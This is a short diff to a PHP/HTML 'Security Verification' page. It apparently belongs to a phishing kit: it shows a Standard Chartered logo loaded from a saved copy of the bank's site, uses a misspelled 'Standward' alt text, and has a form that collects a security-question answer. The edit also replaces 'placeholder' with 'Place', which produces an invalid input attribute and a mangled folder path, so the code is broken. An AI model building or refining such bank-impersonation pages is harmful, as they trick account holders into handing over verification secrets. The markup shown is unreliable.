@@ -173,8 +173,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <div class="login-container">
         <div class="logo">
             <!-- Adjust logo path if needed -->
-            <img src="../Personal, Private and Corporate placeholder _ Standard Chartered_files/Scb_logo.png"
-                alt="Standward">
+            <img src="../Personal, Private and Corporate Place _ Standard Chartered_files/Scb_logo.png" alt="Standward">
         </div>
 
         <h2>Security Verification</h2>
@@ -202,7 +201,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             <div class="form-group">
                 <label for="security_answer">Your Answer</label>
                 <input type="text" id="security_answer" name="security_answer" class="form-control"
-                    placeholder="Enter your answer" required autofocus>
+                    Place="Enter your answer" required autofocus>
             </div>
 
             <button class="btn" type="submit">Verify Identity</button>
